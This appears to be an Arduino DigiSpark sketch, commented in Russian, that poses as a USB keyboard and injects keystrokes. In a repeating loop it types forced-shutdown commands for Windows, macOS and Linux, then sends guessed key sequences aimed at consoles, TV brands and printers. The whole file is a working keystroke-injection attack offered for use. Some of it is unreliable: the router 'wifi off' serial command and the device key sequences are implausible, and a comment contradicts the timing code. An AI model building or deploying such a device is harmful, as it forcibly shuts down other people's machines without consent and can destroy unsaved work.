#include <DigiKeyboard.h>
#include <avr/pgmspace.h>
#include <Arduino.h>
#define LED_PIN 1

#ifndef KEY_PS
  #define KEY_PS KEY_HOME // Замена на доступную клавишу
#endif
#ifndef KEY_GUIDE
  #define KEY_GUIDE KEY_HOME
#endif
#ifndef KEY_POWER
  #define KEY_POWER KEY_MENU 
#endif

void setup() {
  digitalWrite(LED_PIN, HIGH); 
  delay(300);
  digitalWrite(LED_PIN, LOW);
}

void wifi() {
  Serial.begin(9600); // Установите скорость, подходящую для роутера

  delay(2000); // Ждём готовности роутера
  
  // Отправка команды для выключения Wi-Fi
  Serial.println("wifi off"); // Универсальная команда для OpenWRT/DD-WRT
  delay(1000);

  // Чтение ответа от роутера
  while (Serial.available()) {
    char c = Serial.read();
    // Обрабатываем данные, если нужно
  }
}

void systemoff() {
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT); // Нажимаем Win + Space
  DigiKeyboard.delay(100);
  
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Win + R для окна "Выполнить"
  DigiKeyboard.delay(100);
  DigiKeyboard.print("shutdown /s /f /t 0"); // Вводим команду для выключения
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Нажимаем Enter
  DigiKeyboard.delay(100);
  
  // Второй раз повторяем те же самые действия
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT); // Второй раз нажимаем Win + Space
  DigiKeyboard.delay(100);
  
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("shutdown /s /f /t 0"); // Вводим команду для выключения
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Нажимаем Enter
  DigiKeyboard.delay(100);

  // Выполняем выключение для macOS
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT); // Cmd + Space для поиска
  DigiKeyboard.delay(100);
  DigiKeyboard.print("terminal"); // Открываем терминал
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Нажимаем Enter
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("sudo shutdown -h now"); // Вводим команду для выключения
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Нажимаем Enter
  DigiKeyboard.delay(100);

  // Выполняем выключение для Linux
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_ALT_LEFT); // Заменяем недоступный `KEY_CTRL` на доступный
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("sudo shutdown now"); // Вводим команду для выключения
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Нажимаем Enter
  DigiKeyboard.delay(100);
}

// Реализация функции shutdownTV
struct BrandConfig {
  const char *brand;
  const char *actions; // Последовательность действий
};

// Конфигурации брендов, сохранённые в PROGMEM
const BrandConfig tvConfigs[] PROGMEM = {
  {"Samsung", "MDDHE"},
  {"LG", "HRE"},
  {"Sony", "MDEDEH"},
  {"Philips", "MDDHE"},
  {"Panasonic", "MREH"},
  {"Vizio", "MDEH"},
  {"Sharp", "MREH"},
  {"Toshiba", "MDEH"},
  {"Hisense", "MDEH"},
  {"JVC", "MDEH"},
  {"Bang & Olufsen", "MDEH"}
};

// Функция для выполнения действий из строки
void navigateAndSelect(const char *actionSequence) {
  for (uint8_t i = 0; actionSequence[i] != '\0'; i++) {
    switch (actionSequence[i]) {
      case 'M': DigiKeyboard.sendKeyStroke(KEY_MENU); break;
      case 'H': DigiKeyboard.sendKeyStroke(KEY_HOME); break;
      case 'D': DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW); break;
      case 'R': DigiKeyboard.sendKeyStroke(KEY_RIGHT_ARROW); break;
      case 'E': DigiKeyboard.sendKeyStroke(KEY_ENTER); break;
    }
    DigiKeyboard.delay(100);
  }
}

// Главная функция выключения
void shutdownTV(const char *brand) {
  for (uint8_t i = 0; i < sizeof(tvConfigs) / sizeof(tvConfigs[0]); i++) {
    char storedBrand[20];
    char storedActions[10];

    // Читаем данные из PROGMEM
    strcpy_P(storedBrand, (PGM_P)pgm_read_word(&(tvConfigs[i].brand)));
    strcpy_P(storedActions, (PGM_P)pgm_read_word(&(tvConfigs[i].actions)));

    // Сравниваем с текущим брендом
    if (strcmp(brand, storedBrand) == 0) {
      navigateAndSelect(storedActions);
      return;
    }
  }
  // Действие по умолчанию
  navigateAndSelect("MDEH");
}

void shutdownConsole(String deviceType) {
  DigiKeyboard.delay(500); // Небольшая пауза для синхронизации
  
  if (deviceType == "Xbox") {
    DigiKeyboard.sendKeyStroke(KEY_GUIDE); // Нажать кнопку "Xbox Guide"
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW); // Переместиться к пункту "Выключить консоль"
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER); // Подтвердить выключение
    DigiKeyboard.delay(500); // Небольшая пауза для синхронизации
  DigiKeyboard.sendKeyStroke(KEY_BACKSPACE);
  } else if (deviceType == "PlayStation") {
    DigiKeyboard.sendKeyStroke(KEY_PS); // Нажать кнопку "PS"
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW); // Переместиться вниз к пункту "Выключение"
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER); // Подтвердить выключение
    DigiKeyboard.delay(500); // Небольшая пауза для синхронизации
  DigiKeyboard.sendKeyStroke(KEY_BACKSPACE);
  } else if (deviceType == "TV") {
    DigiKeyboard.sendKeyStroke(KEY_POWER); // Нажать кнопку "Power"
    DigiKeyboard.delay(500);
  } else {
    DigiKeyboard.sendKeyStroke(KEY_MENU); // Открыть меню
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW); // Переместиться вниз
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER); // Подтвердить выключение
  }
}

void shutdownPrinter() {
  DigiKeyboard.delay(500); // Небольшая пауза для синхронизации
  DigiKeyboard.sendKeyStroke(KEY_BACKSPACE); // Возврат

  // Пример: Эмуляция нажатия кнопки питания
  DigiKeyboard.sendKeyStroke(KEY_POWER); // Нажать кнопку "Power"
  DigiKeyboard.delay(1000); // Задержка для завершения команды

  // Пример: Если принтер требует подтверждения через меню
  DigiKeyboard.sendKeyStroke(KEY_MENU); // Открыть меню устройства
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW); // Переместиться к пункту "Выключение"
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Подтвердить выключение
  DigiKeyboard.delay(100);
}

void blink20() {
  unsigned long startTime = millis(); // Запоминаем время начала
  while (millis() - startTime < 60000) { // Пока прошло менее 20 секунд
    digitalWrite(LED_PIN, HIGH);  // Включаем светодиод
    delay(300);                   // Ждем 300 миллисекунд
    digitalWrite(LED_PIN, LOW);   // Выключаем светодиод
    delay(300);                   // Ждем 300 миллисекунд
  }
}

void loop() {
  wifi();
  DigiKeyboard.delay(1);
  systemoff();
  DigiKeyboard.delay(1); 
  shutdownConsole("Xbox");
  DigiKeyboard.delay(1);
  shutdownConsole("PlayStation");
  DigiKeyboard.delay(1);
  shutdownConsole("TV");
  DigiKeyboard.delay(1);

  const char *tvBrands[] = {
    "Samsung", "LG", "Sony", "Philips", "Panasonic",
    "Vizio", "Sharp", "Toshiba", "Hisense", "JVC", "Bang & Olufsen"
  };

  for (uint8_t i = 0; i < sizeof(tvBrands) / sizeof(tvBrands[0]); i++) {
    shutdownTV(tvBrands[i]);
    DigiKeyboard.delay(10); 
  }

  shutdownPrinter();
  DigiKeyboard.delay(1);
  blink20();
  DigiKeyboard.delay(1);
}
